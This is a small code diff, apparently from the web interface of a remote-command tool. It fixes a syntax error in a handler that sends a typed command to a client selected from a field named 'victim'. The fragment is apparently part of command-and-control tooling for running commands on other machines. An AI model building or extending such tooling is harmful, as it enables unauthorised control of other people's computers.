@@ -33,7 +33,7 @@
 
       $("#runcmd").on('click', function() { 
 
-          socket.emit('send_client_cmd', { toclient: $("#victim").val();, cmd: $("#cmdinput").val() }, function (data) {
+          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: $("#cmdinput").val() }, function (data) {
                 alert(data) 
           });
 
